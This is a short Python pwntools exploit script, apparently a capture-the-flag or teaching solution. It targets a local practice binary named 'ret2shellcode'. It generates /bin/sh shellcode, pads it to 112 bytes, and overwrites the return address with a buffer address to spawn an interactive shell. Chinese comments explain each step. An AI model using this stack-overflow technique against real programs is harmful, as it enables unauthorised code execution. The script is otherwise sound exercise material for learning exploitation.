#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
# 生成shellcode
# asm: 
#	将汇编指令编译为机器码
# shellcraft.sh():
#	汇编模板，用于生成一个能够执行 /bin/sh 命令的 shellcode
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

# s: esp + 14h
# payload: 0x6c+ 4(ebp) (112)
# shellcode + (112 - len(shellcode)) * "A" + buf2_addr
sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()
